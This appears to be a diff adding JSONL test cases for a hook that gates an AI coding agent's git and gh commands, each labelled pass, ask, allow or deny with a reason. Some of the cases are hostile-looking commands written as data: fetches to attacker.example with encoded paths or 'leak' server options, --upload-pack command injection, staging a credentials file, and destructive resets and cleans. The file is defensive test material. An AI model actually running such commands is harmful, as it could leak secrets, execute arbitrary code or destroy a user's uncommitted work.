+{"id":"G16.016","verdict":"ask","command":"git branch --force x","reason":"deletes, renames over or resets a branch"}
+{"id":"G16.017","verdict":"ask","command":"git update-ref refs/heads/main HEAD","reason":"update-ref"}
+{"id":"G16.018","verdict":"ask","command":"git update-ref HEAD x","reason":"update-ref"}
+{"id":"G16.019","verdict":"ask","command":"git update-ref --stdin","reason":"update-ref"}
+{"id":"G16.020","verdict":"ask","command":"git reset --har","reason":"--hard"}
+{"id":"G16.021","verdict":"ask","command":"git branch -df x","reason":"deletes, renames over or resets a branch"}
+{"id":"G16.022","verdict":"ask","command":"git fetch --upload-p=cmd .","reason":"upload-pack"}
+{"id":"G16.023","verdict":"ask","command":"git fetch origin main --refm='+refs/heads/*:refs/heads/*'","reason":"local branch"}
+{"id":"G16.024","verdict":"ask","command":"git fetch --update-head-ok origin","reason":"update-head-ok"}
+{"id":"G16.025","verdict":"ask","command":"git pull -u origin","reason":"update-head-ok"}
+{"id":"G16.026","verdict":"ask","command":"git --config-env=remote.o.fetch=V fetch","reason":"on the command line"}
+{"id":"G16.027","verdict":"ask","command":"git -c REMOTE.o.FETCH=x fetch","reason":"on the command line"}
+{"id":"G16.028","verdict":"ask","command":"git --git-dir='$X' clean -fdx","reason":"untracked files"}
+{"id":"G16.029","verdict":"ask","command":"git --work-tree='$X' reset --hard","reason":"--hard"}
+{"id":"G16.030","verdict":"deny","command":"git rs src/a/a.utils.test.ts","reason":"test-first module or a test file"}
+{"id":"G16.031","verdict":"deny","command":"git restore --source=HEAD~1 src/a/a.utils.test.ts","reason":"test-first module or a test file"}
+{"id":"G16.032","verdict":"deny","command":"git checkout HEAD~1 -- src/a/a.utils.test.ts","reason":"test-first module or a test file"}
+{"id":"G16.033","verdict":"deny","command":"git checkout HEAD~1 src/a/a.utils.test.ts","reason":"test-first module or a test file"}
+{"id":"G16.034","verdict":"deny","command":"git checkout feat src/a/a.repository.ts","reason":"test-first module or a test file"}
+{"id":"G16.035","verdict":"deny","command":"git restore src/a/a.utils.ts","reason":"test-first module or a test file"}
+{"id":"G16.036","verdict":"deny","command":"git restore '*.test.ts'","reason":"test-first module or a test file"}
+{"id":"G16.037","verdict":"ask","command":"git fetch origin main --refmap='+refs/heads/*:refs/heads/*'","reason":"local branch"}
+{"id":"G16.038","verdict":"ask","command":"git fetch . feat:main","reason":"local branch"}
+{"id":"G16.039","verdict":"ask","command":"git fetch origin main:refs/heads/x","reason":"local branch"}
+{"id":"G16.040","verdict":"ask","command":"git fetch -u origin","reason":"update-head-ok"}
+{"id":"G16.041","verdict":"ask","command":"git fetch --upload-pack=cmd .","reason":"upload-pack"}
+{"id":"G16.042","verdict":"ask","command":"git pull --upload-pack=cmd","reason":"upload-pack"}
+{"id":"G16.043","verdict":"ask","command":"git ls-remote --upload-pack=cmd .","reason":"upload-pack"}
+{"id":"G16.044","verdict":"ask","command":"git clone --upload-pack=cmd x","reason":"upload-pack"}
+{"id":"G16.045","verdict":"ask","command":"git clone -u cmd x","reason":"upload-pack"}
+{"id":"G16.046","verdict":"ask","command":"git -c remote.origin.fetch=x fetch","reason":"on the command line"}
+{"id":"G16.047","verdict":"ask","command":"git -c core.x=y -c remote.o.uploadpack=z fetch","reason":"on the command line"}
+{"id":"G16.048","verdict":"ask","command":"git nuke","reason":"untracked files"}
+{"id":"G16.049","verdict":"ask","command":"git -C . nuke","reason":"untracked files"}
+{"id":"G16.050","verdict":"ask","command":"git wa -B main ../wt x","reason":"worktree add"}
+{"id":"G16.051","verdict":"ask","command":"git wa wt x","reason":"worktree add"}
+{"id":"G16.052","verdict":"ask","command":"git wa ../x","reason":"worktree add"}
+{"id":"G16.053","verdict":"ask","command":"git wa .claude/worktrees/../../x","reason":"worktree add"}
+{"id":"G16.054","verdict":"ask","command":"git wa -f .claude/worktrees/x","reason":"worktree add"}
+{"id":"G16.055","verdict":"ask","command":"git restore src/x.ts","setup":"modified","reason":"uncommitted changes"}
+{"id":"G16.056","verdict":"ask","command":"git checkout -- src/x.ts","setup":"modified","reason":"uncommitted changes"}
+{"id":"G16.057","verdict":"ask","command":"cd .claude/worktrees/feat && git restore src/x.ts","reason":"a cd or an earlier command"}
+{"id":"G16.058","verdict":"ask","command":"git stash pop && git restore src/x.ts","reason":"a cd or an earlier command"}
+{"id":"G16.059","verdict":"ask","command":"printf x > notes.md && git restore notes.md","reason":"a cd or an earlier command"}
+{"id":"G16.060","verdict":"ask","command":"git checkout HEAD -- src/x.ts","setup":"staged","reason":"uncommitted changes"}
+{"id":"G16.061","verdict":"ask","command":"git restore --source=HEAD --staged --worktree src/x.ts","setup":"staged","reason":"uncommitted changes"}
+{"id":"G16.062","verdict":"ask","command":"git restore -SW src/x.ts","setup":"modified","reason":"uncommitted changes"}
+{"id":"G16.063","verdict":"deny","command":"git restore -SW src/a/a.utils.test.ts","reason":"test-first module or a test file"}
+{"id":"G16.064","verdict":"ask","command":"git fetch origin && git checkout main","reason":"a cd or an earlier command"}
+{"id":"G16.065","verdict":"ask","command":"cd src && git checkout main","reason":"a cd or an earlier command"}
+{"id":"G16.066","verdict":"ask","command":"git l1","setup":"cycle","reason":"alias chain"}
+{"id":"G16.067","verdict":"pass","command":"git clean -n"}
+{"id":"G16.068","verdict":"pass","command":"git clean -fn"}
+{"id":"G16.069","verdict":"pass","command":"git clean --dry-run"}
+{"id":"G16.070","verdict":"pass","command":"git reset --soft HEAD~1"}
+{"id":"G16.071","verdict":"pass","command":"git restore --staged src/x.ts"}
+{"id":"G16.072","verdict":"pass","command":"git restore src/x.ts"}
+{"id":"G16.073","verdict":"pass","command":"git fetch origin"}
+{"id":"G16.074","verdict":"pass","command":"git fetch origin main"}
+{"id":"G16.075","verdict":"pass","command":"git fetch origin main:refs/remotes/origin/main"}
+{"id":"G16.076","verdict":"pass","command":"git branch -d feat/x"}
+{"id":"G16.077","verdict":"pass","command":"git checkout main"}
+{"id":"G16.078","verdict":"pass","command":"git wa .claude/worktrees/x -b feat/x"}
+{"id":"G16.079","verdict":"ask","command":"git worktree add .claude/worktrees/x -b feat/x","reason":"not a plain git call"}
+{"id":"G16.080","verdict":"ask","command":"git -C . clean -fdx","reason":"untracked files"}
+{"id":"G16.081","verdict":"ask","command":"git -C . -c clean.requireForce=false clean -dx","reason":"untracked files"}
+{"id":"G16.082","verdict":"ask","command":"git -C . reset --hard","reason":"--hard"}
+{"id":"G16.083","verdict":"ask","command":"git -C . checkout -- .","reason":"overwrites"}
+{"id":"G16.084","verdict":"ask","command":"git -C . restore .","reason":"overwrites"}
+{"id":"G16.085","verdict":"ask","command":"git -C . restore '*.ts'","reason":"overwrites"}
+{"id":"G16.086","verdict":"ask","command":"git -C . restore ':!README.md'","reason":"overwrites"}
+{"id":"G16.087","verdict":"ask","command":"git -C . restore :/","reason":"overwrites"}
+{"id":"G16.088","verdict":"ask","command":"git -C . restore src","reason":"overwrites"}
+{"id":"G16.089","verdict":"ask","command":"git -C . stash clear","reason":"stashed work"}
+{"id":"G16.090","verdict":"ask","command":"git -C . stash drop","reason":"stashed work"}
+{"id":"G16.091","verdict":"ask","command":"git -C . branch -D x","reason":"deletes, renames over or resets a branch"}
+{"id":"G16.092","verdict":"ask","command":"git -C . branch -M x main","reason":"deletes, renames over or resets a branch"}
+{"id":"G16.093","verdict":"ask","command":"git -C . branch -C x main","reason":"deletes, renames over or resets a branch"}
+{"id":"G16.094","verdict":"ask","command":"git -C . branch -f x","reason":"deletes, renames over or resets a branch"}
+{"id":"G16.095","verdict":"ask","command":"git -C . branch --force x","reason":"deletes, renames over or resets a branch"}
+{"id":"G16.096","verdict":"ask","command":"git -C . update-ref refs/heads/main HEAD","reason":"update-ref"}
+{"id":"G16.097","verdict":"ask","command":"git -C . update-ref HEAD x","reason":"update-ref"}
+{"id":"G16.098","verdict":"ask","command":"git -C . update-ref --stdin","reason":"update-ref"}
+{"id":"G16.099","verdict":"ask","command":"git -C . reset --har","reason":"--hard"}
+{"id":"G16.100","verdict":"ask","command":"git -C . branch -df x","reason":"deletes, renames over or resets a branch"}
+{"id":"G16.101","verdict":"ask","command":"git -C . fetch --upload-p=cmd .","reason":"upload-pack"}
+{"id":"G16.102","verdict":"ask","command":"git -C . fetch origin main --refm='+refs/heads/*:refs/heads/*'","reason":"local branch"}
+{"id":"G16.103","verdict":"ask","command":"git -C . fetch --update-head-ok origin","reason":"update-head-ok"}
+{"id":"G16.104","verdict":"ask","command":"git -C . pull -u origin","reason":"update-head-ok"}
+{"id":"G16.105","verdict":"ask","command":"git -C . --config-env=remote.o.fetch=V fetch","reason":"on the command line"}
+{"id":"G16.106","verdict":"ask","command":"git -C . -c REMOTE.o.FETCH=x fetch","reason":"on the command line"}
+{"id":"G16.107","verdict":"ask","command":"git -C . --git-dir='$X' clean -fdx","reason":"untracked files"}
+{"id":"G16.108","verdict":"ask","command":"git -C . fetch origin main --refmap='+refs/heads/*:refs/heads/*'","reason":"local branch"}
+{"id":"G16.109","verdict":"ask","command":"git -C . fetch . feat:main","reason":"local branch"}
+{"id":"G16.110","verdict":"ask","command":"git -C . fetch origin main:refs/heads/x","reason":"local branch"}
+{"id":"G16.111","verdict":"ask","command":"git -C . fetch -u origin","reason":"update-head-ok"}
+{"id":"G16.112","verdict":"ask","command":"git -C . fetch --upload-pack=cmd .","reason":"upload-pack"}
+{"id":"G16.113","verdict":"ask","command":"git -C . pull --upload-pack=cmd","reason":"upload-pack"}
+{"id":"G16.114","verdict":"ask","command":"git -C . ls-remote --upload-pack=cmd .","reason":"upload-pack"}
+{"id":"G16.115","verdict":"ask","command":"git -C . clone --upload-pack=cmd x","reason":"upload-pack"}
+{"id":"G16.116","verdict":"ask","command":"git -C . clone -u cmd x","reason":"upload-pack"}
+{"id":"G16.117","verdict":"ask","command":"git -C . -c remote.origin.fetch=x fetch","reason":"on the command line"}
+{"id":"G16.118","verdict":"ask","command":"git -C . -c core.x=y -c remote.o.uploadpack=z fetch","reason":"on the command line"}
+{"id":"G16.119","verdict":"ask","command":"git -C . wa -B main ../wt x","reason":"worktree add"}
+{"id":"G16.120","verdict":"ask","command":"git -C . wa wt x","reason":"worktree add"}
+{"id":"G16.121","verdict":"ask","command":"git -C . wa ../x","reason":"worktree add"}
+{"id":"G16.122","verdict":"ask","command":"git -C . wa .claude/worktrees/../../x","reason":"worktree add"}
+{"id":"G16.123","verdict":"ask","command":"git -C . wa -f .claude/worktrees/x","reason":"worktree add"}
+{"id":"G16.124","verdict":"ask","command":"git -C . restore src/x.ts","setup":"modified","reason":"uncommitted changes"}
+{"id":"G16.125","verdict":"ask","command":"git -C . checkout -- src/x.ts","setup":"modified","reason":"uncommitted changes"}
+{"id":"G16.126","verdict":"ask","command":"cd .claude/worktrees/feat && git -C . restore src/x.ts","reason":"a cd or an earlier command"}
+{"id":"G16.127","verdict":"ask","command":"git -C . stash pop && git restore src/x.ts","reason":"a cd or an earlier command"}
+{"id":"G16.128","verdict":"ask","command":"printf x > notes.md && git -C . restore notes.md","reason":"a cd or an earlier command"}
+{"id":"G16.129","verdict":"ask","command":"git -C . checkout HEAD -- src/x.ts","setup":"staged","reason":"uncommitted changes"}
+{"id":"G16.130","verdict":"ask","command":"git -C . restore --source=HEAD --staged --worktree src/x.ts","setup":"staged","reason":"uncommitted changes"}
+{"id":"G16.131","verdict":"ask","command":"git -C . restore -SW src/x.ts","setup":"modified","reason":"uncommitted changes"}
+{"id":"G16.132","verdict":"ask","command":"git -C . fetch origin && git checkout main","reason":"a cd or an earlier command"}
+{"id":"G16.133","verdict":"ask","command":"cd src && git -C . checkout main","reason":"a cd or an earlier command"}
+{"id":"G17.01","verdict":"deny","setup":"credfile","command":"git add .credentials.json","reason":"stage a secret: .credentials.json"}
+{"id":"G17.02","verdict":"ask","command":"git clean -n --no-dry-run -f","reason":"untracked files"}
+{"id":"G17.03","verdict":"ask","command":"git clean -fn --no-dry-run","reason":"untracked files"}
+{"id":"G17.04","verdict":"pass","command":"git clean --no-dry-run -n"}
+{"id":"G17.05","verdict":"pass","command":"git clean -f --no-dry-run -n -d"}
+{"id":"G17.06","verdict":"ask","command":"git clean --dry-run --no-dry-run -fd","reason":"untracked files"}
+{"id":"G17.07","verdict":"ask","command":"git clean --dry-run --no-dry -fd","reason":"untracked files"}
+{"id":"G17.08","verdict":"pass","command":"git clean --no-dry-run --dry-run -f"}
+{"id":"G17.09","verdict":"pass","command":"git clean -nf"}
+{"id":"G17.10","verdict":"ask","command":"git -C . clean -n --no-dry-run -f","reason":"untracked files"}
+{"id":"G17.11","verdict":"pass","command":"git clean -n -e x -f"}
+{"id":"G17.12","verdict":"ask","command":"git fetch --upl=cmd .","reason":"upload-pack"}
+{"id":"G17.13","verdict":"ask","command":"git pull --upl=cmd","reason":"upload-pack"}
+{"id":"G17.14","verdict":"ask","command":"git ls-remote --upl cmd .","reason":"upload-pack"}
+{"id":"G17.15","verdict":"ask","command":"git clone --upload=cmd x","reason":"upload-pack"}
+{"id":"G17.16","verdict":"ask","command":"git -C . fetch --upl=cmd .","reason":"upload-pack"}
+{"id":"G17.17","verdict":"ask","command":"git fetch --upload-p cmd .","reason":"upload-pack"}
+{"id":"G17.18","verdict":"ask","command":"git clean -i --no-interactive -fdx","reason":"untracked files"}
+{"id":"G17.19","verdict":"ask","command":"git clean -i --no-i -fdx","reason":"untracked files"}
+{"id":"G17.20","verdict":"ask","command":"git clean -fd --e -n","reason":"untracked files"}
+{"id":"G17.21","verdict":"pass","command":"git clean -fd --e x -n"}
+{"id":"G17.22","verdict":"pass","command":"git clean --no-interactive -i -fdx"}
+{"id":"G17.23","verdict":"pass","command":"git clean -i -fdx"}
+{"id":"G17.24","verdict":"ask","command":"git -C . clean -i --no-interactive -fdx","reason":"untracked files"}
+{"id":"G17.25","verdict":"ask","command":"git clean --interactive --no-interactive -fd","reason":"untracked files"}
+{"id":"G17.26","verdict":"ask","command":"git fetch origin main:main \\","reason":"local branch"}
+{"id":"G17.27","verdict":"ask","command":"git fetch --upload-pack=x . \\","reason":"upload-pack"}
+{"id":"G17.28","verdict":"ask","command":"git fetch origin main --refmap='+refs/heads/*:refs/heads/*' \\","reason":"local branch"}
+{"id":"G17.29","verdict":"ask","command":"git fetch origin main:main; true \\","reason":"local branch"}
+{"id":"G17.30","verdict":"ask","command":"git fetch origin main:main $'a\\'b'","reason":"could not parse"}
+{"id":"G17.31","verdict":"ask","command":"git fetch origin main:main\necho 'x","reason":"could not parse"}
+{"id":"G17.32","verdict":"ask","command":"git fetch origin \"+refs/tags/*:refs/tags/*\"","reason":"outside refs/remotes/"}
+{"id":"G17.33","verdict":"ask","command":"git fetch . +main:refs/tags/v1","reason":"outside refs/remotes/"}
+{"id":"G17.34","verdict":"ask","command":"git fetch . main:refs/tags/v1","reason":"outside refs/remotes/"}
+{"id":"G17.35","verdict":"ask","command":"git fetch . +main:refs/stash","reason":"outside refs/remotes/"}
+{"id":"G17.36","verdict":"ask","command":"git fetch . +main:refs/notes/commits","reason":"outside refs/remotes/"}
+{"id":"G17.37","verdict":"ask","command":"git fetch --prune-tags","reason":"prune-tags"}
+{"id":"G17.38","verdict":"ask","command":"git fetch -p -P","reason":"prune-tags"}
+{"id":"G17.39","verdict":"ask","command":"git fetch --tags --force","reason":"--force"}
+{"id":"G17.40","verdict":"ask","command":"git fetch origin main --refmap='+refs/heads/*:refs/tags/*'","reason":"outside refs/remotes/"}
+{"id":"G17.41","verdict":"ask","command":"git fetch --stdin . <<< '+old:main'","reason":"--stdin"}
+{"id":"G17.42","verdict":"ask","command":"printf '+main:main\\n' | git fetch --stdin .","reason":"--stdin"}
+{"id":"G17.43","verdict":"ask","command":"git fetch --std . <<< '+x:main'","reason":"--stdin"}
+{"id":"G17.44","verdict":"ask","command":"git fetch --set-upstream origin main","reason":"set-upstream"}
+{"id":"G17.45","verdict":"ask","command":"git fetch --depth=1 origin main","reason":"shallow"}
+{"id":"G17.46","verdict":"ask","command":"git fetch --unshallow","reason":"shallow"}
+{"id":"G17.47","verdict":"ask","command":"git fetch --frobnicate origin","reason":"unknown or ambiguous"}
+{"id":"G17.48","verdict":"ask","command":"git fetch --pru","reason":"unknown or ambiguous"}
+{"id":"G17.49","verdict":"ask","command":"git fetch --prune-t","reason":"prune-tags"}
+{"id":"G17.50","verdict":"ask","command":"git fetch -A","reason":"unknown or ambiguous"}
+{"id":"G17.51","verdict":"ask","command":"git fetch --update-shallow","reason":"shallow"}
+{"id":"G17.52","verdict":"ask","command":"git fetch --filter=blob:none origin","reason":"partial clone"}
+{"id":"G17.53","verdict":"ask","command":"git fetch -pP","reason":"prune-tags"}
+{"id":"G17.54","verdict":"ask","command":"git fetch -tf","reason":"--force"}
+{"id":"G17.55","verdict":"pass","command":"git fetch -qp"}
+{"id":"G17.56","verdict":"pass","command":"git fetch --no-filter"}
+{"id":"G17.57","verdict":"pass","command":"git fetch --all --prune"}
+{"id":"G17.58","verdict":"pass","command":"git fetch --quiet"}
+{"id":"G17.59","verdict":"pass","command":"git fetch --no-tags origin"}
+{"id":"G17.60","verdict":"pass","command":"git fetch --jobs=4 --all"}
+{"id":"G17.61","verdict":"pass","command":"git fetch --verbose"}
+{"id":"G17.62","verdict":"pass","command":"git fetch -q"}
+{"id":"G17.63","verdict":"pass","command":"git fetch --no-stdin"}
+{"id":"G17.64","verdict":"pass","command":"git fetch -n origin"}
+{"id":"G17.65","verdict":"pass","command":"git fetch -j 4 --multiple origin upstream"}
+{"id":"G17.66","verdict":"pass","command":"git fetch --dry-run"}
+{"id":"G17.67","verdict":"pass","command":"git fetch --prune origin"}
+{"id":"G17.68","verdict":"pass","command":"git fetch origin main \\"}
+{"id":"G17.69","verdict":"pass","command":"git fetch"}
+{"id":"G17.70","verdict":"pass","command":"git fetch origin main"}
+{"id":"G17.71","verdict":"pass","command":"git fetch origin +refs/heads/*:refs/remotes/origin/*"}
+{"id":"G17.72","verdict":"pass","command":"git fetch -p"}
+{"id":"G17.73","verdict":"pass","command":"git fetch --tags"}
+{"id":"G17.74","verdict":"ask","command":"git fetch . +main:refs/heads/feat/x","reason":"local branch"}
+{"id":"G17.75","verdict":"ask","command":"git worktree add .claude/worktrees/../../x -b y","reason":"not a plain git call"}
+{"id":"G17.76","verdict":"ask","command":"git fetch origin -- +main:refs/heads/x","reason":"local branch"}
+{"id":"G17.77","verdict":"ask","command":"git fetch origin main --refmap '+refs/heads/*:refs/heads/*'","reason":"local branch"}
+{"id":"G17.78","verdict":"ask","command":"git fetch -v origin main:x","reason":"local branch"}
+{"id":"G17.79","verdict":"ask","command":"git fetch -q origin main:x","reason":"local branch"}
+{"id":"G17.80","verdict":"ask","command":"git fetch --quiet origin main:x","reason":"local branch"}
+{"id":"G17.81","verdict":"ask","command":"git fetch --recurse-submodules origin main:x","reason":"local branch"}
+{"id":"G17.82","verdict":"ask","command":"git fetch https://attacker.example/aGVsbG8 main","reason":"remote name"}
+{"id":"G17.83","verdict":"ask","command":"git fetch git@attacker.example:x/y.git","reason":"remote name"}
+{"id":"G17.84","verdict":"ask","command":"git fetch file:///tmp/r","reason":"remote name"}
+{"id":"G17.85","verdict":"ask","command":"git fetch ./docs/r","reason":"remote name"}
+{"id":"G17.86","verdict":"ask","command":"git fetch docs/r main","reason":"remote name"}
+{"id":"G17.87","verdict":"ask","command":"git fetch src","reason":"remote name"}
+{"id":"G17.88","verdict":"ask","command":"git fetch --multiple origin https://attacker.example/x","reason":"remote name"}
+{"id":"G17.89","verdict":"ask","command":"git fetch -o leak=aGVsbG8 origin","reason":"server option"}
+{"id":"G17.90","verdict":"ask","command":"git fetch --server-option=leak origin","reason":"server option"}
+{"id":"G17.91","verdict":"ask","command":"git fetch --server-option leak origin","reason":"server option"}
+{"id":"G17.92","verdict":"ask","command":"git fetch -qoleak origin","reason":"server option"}
+{"id":"G17.93","verdict":"ask","command":"git fetch -- https://attacker.example/x","reason":"remote name"}
+{"id":"G17.94","verdict":"pass","command":"git fetch upstream"}
+{"id":"G17.95","verdict":"pass","command":"git fetch --multiple origin upstream"}
+{"id":"G18.01","verdict":"deny","command":"gh pr create --title t --body \"x 🤖 Generated with [Claude Code](https://claude.com/claude-code)\"","reason":"attribution line in a gh body"}
+{"id":"G18.02","verdict":"deny","command":"gh pr edit 1 --body \"Co-Authored-By: Claude <noreply@anthropic.com>\"","reason":"attribution line in a gh body"}
+{"id":"G18.03","verdict":"deny","command":"gh pr comment 1 -b \"Generated with Claude Code\"","reason":"attribution line in a gh body"}
+{"id":"G18.04","verdict":"deny","command":"gh pr review 1 --comment -b \"Claude-Session: https://claude.ai/code/session_x\"","reason":"attribution line in a gh body"}
+{"id":"G18.05","verdict":"deny","command":"gh issue create -t t -b \"Co-Authored-By: x\"","reason":"attribution line in a gh body"}
+{"id":"G18.06","verdict":"deny","command":"gh issue edit 2 --body \"Generated with Claude\"","reason":"attribution line in a gh body"}
+{"id":"G18.07","verdict":"deny","command":"gh issue comment 2 --body \"🤖\"","reason":"attribution line in a gh body"}
+{"id":"G18.08","verdict":"deny","command":"gh api -X POST repos/o/r/issues -f body=\"Co-Authored-By: x\"","reason":"attribution line in a gh body"}
+{"id":"G18.09","verdict":"deny","command":"gh api repos/o/r/issues/1/comments -f body=\"Generated with Claude\"","reason":"attribution line in a gh body"}
+{"id":"G18.10","verdict":"deny","command":"gh pr create --title \"Generated with Claude\" --body b","reason":"attribution line in a gh body"}
+{"id":"G18.11","verdict":"deny","setup":"ghbody","command":"gh pr create --title t --body-file docs/pr-sign.md","reason":"attribution line in a gh body"}
+{"id":"G18.12","verdict":"deny","setup":"ghbody","command":"gh pr create -t t --body-file=docs/pr-sess.md","reason":"attribution line in a gh body"}
+{"id":"G18.13","verdict":"deny","setup":"ghbody","command":"gh issue create -t t -F docs/pr-sign.md","reason":"attribution line in a gh body"}
+{"id":"G18.14","verdict":"deny","setup":"ghbody","command":"gh api repos/o/r/issues -F body=@docs/pr-sign.md","reason":"attribution line in a gh body"}
+{"id":"G18.15","verdict":"deny","setup":"ghbody","command":"gh api repos/o/r/issues --input docs/pr-sign.md","reason":"attribution line in a gh body"}
+{"id":"G18.16","verdict":"deny","setup":"ghbody","command":"gh pr create -t t --body-file docs/pr-only-root.md","reason":"attribution line in a gh body"}
+{"id":"G18.17","verdict":"deny","command":"git commit -m \"x\" -m \"Claude-Session: https://claude.ai/code/session_x\"","reason":"no attribution trailer"}
+{"id":"G18.18","verdict":"deny","setup":"nopy","command":"git switch x && gh pr create -t t -b \"Co-Authored-By: x\"","reason":"attribution line in a gh body"}
+{"id":"G18.19","verdict":"ask","command":"gh pr create --title t --body b","reason":"acts on a pull request"}
+{"id":"G18.20","verdict":"ask","setup":"ghbody","command":"gh pr create -t t --body-file docs/pr-clean.md","reason":"acts on a pull request"}
+{"id":"G18.21","verdict":"ask","command":"gh issue comment 2 --body ok","reason":"writes to GitHub"}
+{"id":"G18.22","verdict":"ask","command":"gh api repos/o/r/issues -f body=ok","reason":"writes to GitHub"}
+{"id":"G18.23","verdict":"ask","setup":"ghbody","command":"gh pr create -t t --body-file -","reason":"acts on a pull request"}
+{"id":"G18.24","verdict":"ask","setup":"ghbody","command":"gh pr create -t t --body-file docs/pr-out.md","reason":"acts on a pull request"}
+{"id":"G18.25","verdict":"ask","setup":"ghbody","command":"gh pr create -t t --body-file docs/missing.md","reason":"acts on a pull request"}
+{"id":"G18.26","verdict":"ask","setup":"ghbody","command":"gh pr create -t t --body-file docs/pr-fifo","reason":"acts on a pull request"}
+{"id":"G18.27","verdict":"ask","command":"gh pr review 1 --approve","reason":"acts on a pull request"}
+{"id":"G18.28","verdict":"pass","command":"gh pr view 1"}
+{"id":"G18.29","verdict":"ask","command":"gh api repos/o/r","reason":"writes to GitHub"}
+{"id":"G18.30","verdict":"deny","setup":"ghbody","command":"git -C .. status && gh pr create -t t --body-file docs/pr-only-root.md","reason":"attribution line in a gh body"}
+{"id":"G18.31","verdict":"deny","command":"gh -R o/r pr create -t t -b \"Co-Authored-By: x\"","reason":"attribution line in a gh body"}
+{"id":"G18.32","verdict":"deny","command":"gh pr -R o/r create -t t -b \"Co-Authored-By: x\"","reason":"attribution line in a gh body"}
+{"id":"G18.33","verdict":"deny","command":"gh pr --repo=o/r edit 1 --body \"Co-Authored-By: x\"","reason":"attribution line in a gh body"}
+{"id":"G18.34","verdict":"deny","command":"gh --repo o/r issue comment 2 --body \"Co-Authored-By: x\"","reason":"attribution line in a gh body"}
+{"id":"G18.35","verdict":"deny","setup":"ghbody","command":"gh -R o/r pr create -t t --body-file docs/pr-sign.md","reason":"attribution line in a gh body"}
+{"id":"G18.36","verdict":"ask","command":"gh -R o/r pr create -t t -b ok","reason":"acts on a pull request"}
+{"id":"G18.37","verdict":"ask","command":"gh pr -R o/r merge 1","reason":"acts on a pull request"}
+{"id":"G18.38","verdict":"ask","command":"gh --repo o/r issue comment 2 --body ok","reason":"writes to GitHub"}
+{"id":"G18.39","verdict":"deny","command":"gh pr comment 1 -b \"Claude-Session: x\"","reason":"attribution line in a gh body"}
+{"id":"G18.40","verdict":"deny","command":"gh pr comment 1 -b \"see claude.ai/code/session_x\"","reason":"attribution line in a gh body"}
+{"id":"G18.41","verdict":"pass","command":"gh pr view 1 --json body -q .body | grep Co-Authored-By"}
+{"id":"G14.143","verdict":"ask","setup":"proj","command":"git -C __OUT_TREE__ commit -m \"feat(x): one line\"","reason":"outside the project"}
+{"id":"G14.144","verdict":"ask","setup":"proj","cwd":"__FEAT_TREE__/src","command":"git -C .. commit -m x","reason":"not a plain git call"}
+{"id":"G14.145","verdict":"ask","setup":"proj","command":"git -C . commit -m x","reason":"not a plain git call"}
+{"id":"G20.001","verdict":"ask","command":"git fetch origin main:main","reason":"local branch"}
+{"id":"G20.002","verdict":"pass","command":"git merge --ff-only origin/main"}
+{"id":"G21.001","verdict":"allow","setup":"lp","command":"git push -u origin feat/s1","reason":"loop record"}
+{"id":"G21.002","verdict":"allow","setup":"lp","command":"gh pr create --repo o/r --base audit/x --head feat/s1 --title \"t\" --body-file docs/work/s1/pr-body.md","reason":"loop record"}
+{"id":"G21.003","verdict":"ask","setup":"lpnorec","command":"git push -u origin feat/s1","reason":"pushes to a remote"}
+{"id":"G21.004","verdict":"ask","setup":"lpnobar","command":"git push -u origin feat/s1","reason":"pushes to a remote"}
+{"id":"G21.005","verdict":"ask","setup":"lps2","command":"git push -u origin feat/s1","reason":"pushes to a remote"}
+{"id":"G21.006","verdict":"ask","setup":"lpother","command":"git push -u origin feat/s1","reason":"pushes to a remote"}
+{"id":"G21.039","verdict":"ask","setup":"lpnobar","command":"gh pr create --repo o/r --base audit/x --head feat/s1 --title \"t\" --body-file docs/work/s1/pr-body.md","reason":"acts on a pull request"}
+{"id":"G21.007","verdict":"ask","setup":"lp","command":"git push -u origin HEAD:main","reason":"pushes to a remote"}
+{"id":"G21.008","verdict":"ask","setup":"lp","command":"git push -u origin +feat/s1","reason":"pushes to a remote"}
+{"id":"G21.009","verdict":"ask","setup":"lp","command":"git push -u origin feat/s1:main","reason":"pushes to a remote"}
+{"id":"G21.010","verdict":"ask","setup":"lp","command":"git push -u origin feat/s1 --tags","reason":"pushes to a remote"}
+{"id":"G21.011","verdict":"ask","setup":"lp","command":"git push --mirror -u origin feat/s1","reason":"pushes to a remote"}
+{"id":"G21.012","verdict":"ask","setup":"lp","command":"git push -u origin --delete feat/s1","reason":"pushes to a remote"}
+{"id":"G21.013","verdict":"ask","setup":"lp","command":"git push --force-with-lease -u origin feat/s1","reason":"FORCE push"}
+{"id":"G21.014","verdict":"ask","setup":"lp","command":"git push --no-verify -u origin feat/s1","reason":"pushes to a remote"}
+{"id":"G21.015","verdict":"ask","setup":"lp","command":"git push origin feat/s1","reason":"pushes to a remote"}
+{"id":"G21.016","verdict":"ask","setup":"lp","command":"git -C . push -u origin feat/s1","reason":"pushes to a remote"}
+{"id":"G21.017","verdict":"ask","setup":"lp","command":"GIT_SSH_COMMAND=x git push -u origin feat/s1","reason":"pushes to a remote"}
+{"id":"G21.018","verdict":"ask","setup":"lp","command":"git push -u origin feat/s1 && echo","reason":"pushes to a remote"}
+{"id":"G21.019","verdict":"ask","setup":"lpcfgpush","command":"git push -u origin feat/s1","reason":"pushes to a remote"}
+{"id":"G21.020","verdict":"ask","setup":"lpcfginsteadof","command":"git push -u origin feat/s1","reason":"pushes to a remote"}
+{"id":"G21.021","verdict":"ask","setup":"lpcfgfollow","command":"git push -u origin feat/s1","reason":"pushes to a remote"}
+{"id":"G21.022","verdict":"ask","setup":"lpcfgssh","command":"git push -u origin feat/s1","reason":"pushes to a remote"}
+{"id":"G21.023","verdict":"ask","setup":"lpcfginclude","command":"git push -u origin feat/s1","reason":"pushes to a remote"}
+{"id":"G21.040","verdict":"ask","setup":"lpcfgmirror","command":"git push -u origin feat/s1","reason":"pushes to a remote"}
+{"id":"G21.041","verdict":"ask","setup":"lpcfgrecv","command":"git push -u origin feat/s1","reason":"pushes to a remote"}
+{"id":"G21.042","verdict":"ask","setup":"lpcfgopt","command":"git push -u origin feat/s1","reason":"pushes to a remote"}
+{"id":"G21.024","verdict":"ask","setup":"lptag","command":"git push -u origin feat/s1","reason":"pushes to a remote"}
+{"id":"G21.025","verdict":"ask","setup":"lpremote","command":"git push -u origin feat/s1","reason":"pushes to a remote"}
+{"id":"G21.026","verdict":"ask","setup":"lp","command":"gh pr create --repo o/r --base main --head feat/s1 --title \"t\" --body-file docs/work/s1/pr-body.md","reason":"acts on a pull request"}
+{"id":"G21.027","verdict":"ask","setup":"lp","command":"gh pr create --repo other/r --base audit/x --head feat/s1 --title \"t\" --body-file docs/work/s1/pr-body.md","reason":"acts on a pull request"}
